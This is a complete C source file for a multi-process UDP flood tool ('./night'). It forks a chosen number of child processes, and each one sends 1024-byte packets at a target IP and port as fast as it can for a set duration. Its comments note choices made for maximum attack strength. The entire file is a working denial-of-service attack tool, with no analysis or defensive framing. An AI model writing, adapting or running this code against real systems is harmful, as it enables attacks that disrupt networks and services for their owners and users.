#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <time.h>
#include <errno.h> // For errno

void usage() {
    printf("Usage: ./night ip port time processes\n");
    exit(1);
}

// Attack function executed by each child process
void attack(const char *target_ip, int target_port, int duration_sec) {
    int sockfd;
    struct sockaddr_in server_addr;
    char buffer[1024]; // Payload
    time_t start_time = time(NULL);
    unsigned long packets_sent = 0;

    // Create UDP socket
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket creation failed");
        exit(1); // Child exits on failure
    }

    // Prepare server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    if (inet_pton(AF_INET, target_ip, &server_addr.sin_addr) <= 0) {
        fprintf(stderr, "Invalid address/ Address not supported: %s\n", target_ip);
        close(sockfd);
        exit(1); // Child exits on failure
    }

    // Fill buffer (optional: randomize?)
    memset(buffer, 'X', sizeof(buffer)); // Simple payload

    printf("Child PID %d: Attacking %s:%d for %d seconds...\n", getpid(), target_ip, target_port, duration_sec);

    // Attack loop
    while (1) {
        // Check duration
        if (time(NULL) - start_time >= duration_sec) {
            break;
        }

        // Send UDP packet
        if (sendto(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            // Non-fatal errors might occur (e.g., network buffer full), maybe log and continue?
            // perror("sendto failed");
            // For simplicity, let's break on error for now. Or just ignore it and keep trying.
            // Let's ignore transient errors for max effort
            if (errno != ENOBUFS && errno != EAGAIN && errno != EWOULDBLOCK) {
                 perror("sendto failed");
                 break; // Exit on more serious errors
            }
        } else {
            packets_sent++;
        }
         // usleep(10); // Optional small delay to prevent overwhelming local resources immediately? Or remove for max speed. Remove for "powerful".
    }

    printf("Child PID %d: Attack finished. Sent ~%lu packets.\n", getpid(), packets_sent);
    close(sockfd);
    exit(0); // Child successfully finishes
}


int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    // Variable Declarations ("Include all variables")
    char *target_ip;
    int target_port;
    int duration_sec;
    int num_processes;
    int i; // Loop counter
    pid_t pid; // Process ID

    // Argument Parsing
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    duration_sec = atoi(argv[3]);
    num_processes = atoi(argv[4]);

    // Basic Input Validation
    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "Error: Invalid port number %d.\n", target_port);
        usage();
    }
    if (duration_sec <= 0) {
        fprintf(stderr, "Error: Duration must be positive.\n");
        usage();
    }
    if (num_processes <= 0) {
        fprintf(stderr, "Error: Number of processes must be positive.\n");
        usage();
    }

    printf("Starting attack on %s:%d for %d seconds with %d processes.\n",
           target_ip, target_port, duration_sec, num_processes);

    // Fork child processes
    for (i = 0; i < num_processes; i++) {
        pid = fork();
        if (pid < 0) {
            perror("fork failed");
            // Should probably kill already started children before exiting
            // For simplicity, just exit here. A real tool would handle this better.
            exit(1);
        } else if (pid == 0) {
            // Child process
            // Seed random number generator differently for each child? Not strictly needed for UDP flood.
            srand(time(NULL) ^ getpid()); // Seed rand if needed later
            attack(target_ip, target_port, duration_sec);
            // attack() function calls exit(), so this point is not reached in the child
        } else {
            // Parent process - continue loop to fork more children
            printf("Parent PID %d: Forked child PID %d\n", getpid(), pid);
        }
    }

    // Parent process waits for all children to complete
    printf("Parent PID %d: All children forked. Waiting for attack duration (%d seconds)...\n", getpid(), duration_sec);

    // Wait for all children to exit
    int status;
    pid_t finished_pid;
    int children_finished = 0;
    while (children_finished < num_processes) {
         // Wait for any child process to exit
         finished_pid = wait(&status);
         if (finished_pid < 0) {
             if (errno == ECHILD) {
                 // No more children left to wait for
                 printf("Parent: All children have apparently finished.\n");
                 break;
             } else {
                 perror("wait failed");
                 // Decide how to handle wait errors, maybe break?
                 break;
             }
         }

         children_finished++;
         printf("Parent PID %d: Child PID %d finished ", getpid(), finished_pid);
         if (WIFEXITED(status)) {
             printf("with status %d.\n", WEXITSTATUS(status));
         } else if (WIFSIGNALED(status)) {
             printf("terminated by signal %d.\n", WTERMSIG(status));
         } else {
             printf("with unknown status.\n");
         }
    }


    printf("Parent PID %d: Attack concluded. All child processes terminated.\n", getpid());

    return 0;
}